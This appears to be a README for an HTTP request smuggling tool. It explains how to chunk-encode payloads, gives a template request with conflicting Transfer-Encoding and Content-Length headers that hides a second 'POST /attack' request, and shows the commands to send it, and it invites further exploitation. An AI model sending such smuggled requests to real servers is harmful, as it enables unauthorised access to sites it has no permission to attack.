# **Socky: HTTP Request Smuggling Tool**

**Socky** is a tool designed for performing HTTP request smuggling attacks. This tool enables you to craft and send chunked requests that may exploit vulnerabilities in web applications, particularly those related to improper handling of chunked encoding. You can generate chunked data using a helper script (`paycraft.py`) and then use Socky to test for vulnerabilities in the target server.

## **Setup Instructions**

1. **Prepare the Request File (`request.txt`)**

   First, you need to create a request file where you will write the chunked HTTP requests. You can manually craft chunked requests, but you can also use the `paycraft.py` script to generate the chunked data.

   **How to use `paycraft.py`:**

   - Run the following command to generate chunked data for your payload:
     ```bash
     python paycraft.py "{data}"
     ```
     Replace `{data}` with the body content you want to send, and `paycraft.py` will return the chunked-encoded version of that data.

   - Example:
     ```bash
     python paycraft.py "This is my secret payload"
     ```
     This will output chunked-encoded data like:
     ```
     1\r\nT\r\n
     1\r\nh\r\n
     1\r\ni\r\n
     1\r\ns\r\n
     1\r\n \r\n
     1\r\nm\r\n
     1\r\ny\r\n
     1\r\n \r\n
     1\r\ns\r\n
     1\r\ne\r\n
     1\r\nc\r\n
     1\r\nr\r\n
     1\r\ne\r\n
     1\r\nt\r\n
     1\r\n \r\n
     1\r\np\r\n
     1\r\na\r\n
     1\r\ny\r\n
     1\r\nl\r\n
     1\r\no\r\n
     1\r\na\r\n
     1\r\nd\r\n
     0\r\n\r\n
     ```

   **Example request file (`request.txt`)**:
   ```
   POST /path/to/target HTTP/1.1
   Host: target.com
   Transfer-Encoding: chunked
   Content-Length: 5
   Connection: close
   
   0
   
   POST /attack HTTP/1.1
   Host: target.com
   Content-Length: 13
   Connection: close
   {insert chunked data here}

   0
   ```

   Replace `{insert chunked data here}` with the chunked-encoded data generated by `paycraft.py`.

2. **Run Socky**

   Once the `request.txt` file is ready, run Socky to send the crafted requests to the target server and analyze the responses.

   ```bash
   python sock.py request.txt
   ```

   - **`request.txt`**: This is the file containing your crafted chunked requests.
   - Socky will send the requests and analyze the response to identify any vulnerabilities.

3. **Analyze the Response**

   After sending the crafted request, Socky will display the server's response. The tool will help you understand if a request smuggling vulnerability exists by showing any anomalies in the server's behavior.

4. **Conduct Further Attacks**

   Once you’ve identified a vulnerability, you can proceed with more sophisticated smuggling techniques or other attacks to fully exploit the vulnerability. Socky helps automate these tasks and provides insights into how the server handles crafted requests.

## **How Socky Works**

1. **Crafting Malicious Requests**  
   Socky helps you manually craft requests with chunked encoding or use `paycraft.py` to generate chunked data for the request body. You can then insert the chunked data into your request file.

2. **Sending Requests**  
   Socky sends the crafted request to the target server. After sending the request, the tool waits for the server's response.

3. **Analyzing Responses**  
   Socky prints the server's response. If the server improperly handles multiple requests (e.g., processing them as one), this indicates a potential vulnerability to HTTP request smuggling.

## **Example Output**

When you run Socky, you will see the response from the target server. An example output could look like this:

```
[+] Sending chunked request to http://target.com/path/to/target
[+] Response: 200 OK
[+] Smuggling successful, check for unauthorized access or behavior.
```

If the server improperly processes the requests, you may observe anomalies or unexpected behavior in the response, such as unauthorized access or incorrect data handling.